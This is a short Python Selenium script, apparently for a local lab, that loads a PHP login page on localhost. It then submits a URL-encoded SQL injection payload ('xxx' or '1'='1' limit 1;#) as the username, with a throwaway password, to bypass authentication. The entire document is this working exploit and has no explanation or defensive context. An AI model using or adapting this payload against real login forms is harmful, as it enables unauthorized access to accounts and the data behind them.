from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
import time

def main():
	driver = webdriver.Firefox()
	url = "http://localhost/loginPage.php"
	driver.get(url)
	time.sleep(5)
	url = "http://localhost/loginPage.php?username=xxx%27+or+%271%27%3D%271%27+limit+1%3B%23&password=icandowithoutpassword"
	driver.get(url)
	time.sleep(5)
	driver.close()

main()
